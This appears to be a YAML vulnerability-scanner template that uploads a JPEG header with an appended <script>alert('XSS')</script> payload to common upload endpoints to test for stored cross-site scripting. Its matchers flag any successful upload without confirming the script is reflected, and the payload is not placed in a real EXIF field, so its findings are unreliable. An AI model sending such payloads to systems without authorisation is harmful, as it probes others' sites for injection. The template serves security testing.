id: medium-upload-image-metadata-xss-injection

info:
  name: Image Metadata XSS Injection - Elite Detection
  author: redteam-elite
  severity: medium
  description: |
    Detects XSS vulnerabilities in image metadata processing where malicious JavaScript
    can be injected into EXIF data and executed when metadata is displayed.
  reference:
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
    - https://cwe.mitre.org/data/definitions/79.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
  tags: upload,xss,metadata,exif,image

variables:
  xss_payload: "<script>alert('XSS')</script>"
  exif_xss: "{{hex_decode('ffd8ffe000104a46494600010101006000600000ffdb004300080606070605080707070909080a0c140d0c0b0b0c1912130f141d1a1f1e1d1a1c1c20242e2720222c231c1c2837292c30313434341f27393d38323c2e333432ffdb0043010909090c0b0c180d0d1832211c213232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232ffc00011080001000103012200021101031101ffc4001f0000010501010101010100000000000000000102030405060708090a0bffc400b5100002010303020403050504040000017d01020300041105122131410613516107227114328191a1082342b1c11552d1f02433627282090a161718191a25262728292a3435363738393a434445464748494a535455565758595a636465666768696a737475767778797a838485868788898a92939495969798999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9cad2d3d4d5d6d7d8d9dae1e2e3e4e5e6e7e8e9eaf1f2f3f4f5f6f7f8f9faffc4001f0100030101010101010101010000000000000102030405060708090a0bffc400b51100020102040403040705040400010277000102031104052131061241510761711322328108144291a1b1c109233352f0156272d10a162434e125f11718191a262728292a35363738393a434445464748494a535455565758595a636465666768696a737475767778797a82838485868788898a92939495969798999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9cad2d3d4d5d6d7d8d9dae2e3e4e5e6e7e8e9eaf2f3f4f5f6f7f8f9faffda000c03010002110311003f00')}}{{xss_payload}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/upload"
      - "{{BaseURL}}/upload.php"
      - "{{BaseURL}}/image/upload"
      - "{{BaseURL}}/media/upload"

    headers:
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"

    body: |
      ------WebKitFormBoundary7MA4YWxkTrZu0gW
      Content-Disposition: form-data; name="file"; filename="{{randstr}}.jpg"
      Content-Type: image/jpeg

      {{exif_xss}}
      ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 302

      - type: word
        condition: or
        words:
          - "upload successful"
          - "image uploaded"
          - "file uploaded"

    extractors:
      - type: regex
        name: metadata-display
        part: body
        regex:
          - "(?i)<script>alert\\('XSS'\\)</script>"
          - "(?i)alert\\('XSS'\\)"
